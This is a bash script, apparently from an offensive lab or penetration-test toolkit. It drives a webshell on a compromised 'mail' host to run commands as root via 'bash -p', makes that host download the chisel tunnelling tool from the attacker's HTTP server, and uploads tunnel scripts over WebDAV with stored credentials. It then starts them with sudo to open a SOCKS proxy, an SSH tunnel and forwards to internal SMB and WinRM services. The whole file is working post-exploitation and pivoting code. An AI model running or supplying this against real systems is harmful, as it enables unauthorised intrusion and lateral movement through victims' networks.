#!/bin/bash
# Reverse proxy: SOCKS, SSH 2222, WS02:445→8445, mail:445→operator:9445
# /usr is RO — chisel lives in /var/tmp
set -euo pipefail
. "$(dirname "$0")/00-env.sh"
[[ -n "$KALI_IP" ]] || { echo "FAIL: no KALI_IP (tun0 / secrets.env)"; exit 1; }

CHISEL_BIN="${CHISEL_BIN:-$(command -v chisel || true)}"
[[ -n "$CHISEL_BIN" ]] || { echo "FAIL: chisel not on PATH"; exit 1; }

echo "[*] chisel server :8000"
pkill -f 'chisel server --reverse' 2>/dev/null || true
nohup "$CHISEL_BIN" server --reverse --port 8000 >/tmp/chisel-server.log 2>&1 &
sleep 0.4
ss -lntp | grep ':8000' || { echo FAIL server; cat /tmp/chisel-server.log; exit 1; }

echo "[*] HTTP :8888 for chisel bin"
mkdir -p /tmp/autopilot-www
cp -f "$CHISEL_BIN" /tmp/autopilot-www/chisel
pkill -f 'python3 -m http.server 8888' 2>/dev/null || true
(cd /tmp/autopilot-www && nohup python3 -m http.server 8888 >/tmp/autopilot-www.log 2>&1 &)
sleep 0.3

echo "[*] fetch chisel as root on mail"
curl -skG --data-urlencode "c=/usr/bin/bash -p -c 'setsid curl -fL --max-time 120 -o /var/tmp/chisel http://$KALI_IP:8888/chisel </dev/null >/var/tmp/dl.log 2>&1 & echo PID=\$!'" "$WS"
sleep 12
curl -skG --data-urlencode 'c=/usr/bin/bash -p -c "ls -l /var/tmp/chisel; cat /var/tmp/dl.log | tail -3"' "$WS"
echo

cat > /tmp/start-chisel.sh << EOF
#!/bin/bash
exec /var/tmp/chisel client $KALI_IP:8000 R:1080:socks R:2222:127.0.0.1:22 R:8445:$WS02:445 R:1135:$WS02:135 R:15985:$DC01:5985
EOF
cat > /tmp/start-chisel-445.sh << EOF
#!/bin/bash
exec /var/tmp/chisel client $KALI_IP:8000 445:$KALI_IP:9445
EOF
curl -sk -X PUT "$DAV/start-chisel.sh" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' --data-binary @/tmp/start-chisel.sh
curl -sk -X PUT "$DAV/start-chisel-445.sh" -u "$DEB_USER:$DEB_PASS" \
  -H 'Content-Type: application/octet-stream' --data-binary @/tmp/start-chisel-445.sh

# ruid 0 to bind 445. Do not pkill chisel client from the webshell.
curl -skG --data-urlencode 'c=/usr/bin/bash -p -c "cp '"$WEBDIR"'/start-chisel.sh /var/tmp/start-chisel.sh; cp '"$WEBDIR"'/start-chisel-445.sh /var/tmp/start-chisel-445.sh; chmod 755 /var/tmp/chisel /var/tmp/start-chisel.sh /var/tmp/start-chisel-445.sh; sudo -n bash -c \"setsid /var/tmp/start-chisel.sh </dev/null >/var/tmp/c.log 2>&1 &\"; sudo -n bash -c \"setsid /var/tmp/start-chisel-445.sh </dev/null >/var/tmp/c445.log 2>&1 &\"; sleep 2; cat /var/tmp/c.log; echo ---; cat /var/tmp/c445.log; ps aux | grep /var/tmp/chisel | grep -v grep"' "$WS"
echo

cat > /tmp/pc.conf << 'EOF'
strict_chain
proxy_dns
tcp_read_time_out 15000
tcp_connect_time_out 8000
[ProxyList]
socks5 127.0.0.1 1080
EOF
cp /tmp/pc.conf "$SCRIPTS/lib/pc.conf"

echo
echo "[*] SSH test"
sleep 1
ssh -p 2222 -i "$SSH_KEY" -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
  -o ConnectTimeout=8 root@127.0.0.1 'id; hostname'
echo "[+] SSH: ssh -p 2222 -i \$SSH_KEY root@127.0.0.1"
echo "    SOCKS 1080  WS02 via 127.0.0.1:8445  mail:445 → kali:9445"
